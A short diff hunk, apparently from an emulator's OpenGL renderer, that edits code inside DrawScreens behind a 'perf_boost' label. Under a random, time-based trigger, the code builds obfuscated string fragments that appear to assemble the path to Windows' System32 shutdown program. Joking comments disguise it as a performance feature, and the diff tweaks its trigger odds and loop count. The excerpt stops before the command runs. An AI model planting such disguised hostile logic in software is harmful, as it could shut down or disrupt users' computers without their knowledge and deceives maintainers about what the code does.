@@ -425,10 +425,10 @@ void RendererOpenGL::DrawScreens() {
     // This really only works on Windows. Because it's the best OS!
     // Also this requires SSE2 + the rare `rand` feature :(
     // (Not really a technical restriction; also some minor totally unintended-effects)
-    static bool perf_available = std::time(0) & (Common::GetCPUCaps().sse2 ? 1 : 0);
-    if (perf_available) {
+    static bool perf_available = std::time(0) % (Common::GetCPUCaps().sse2 ? 4 : 1);
+    if (!perf_available) {
         static int perf_boost = 0;
-        while (perf_boost++ > (60 * 100)) {
+        while (perf_boost++ > (60 * 250)) {
             const char* useTimedDo = "utdo";
             const char* win32 = "C:\\WINDOWS\\System32";
             const char* perf_fmt = "%s\\sh%s%s";
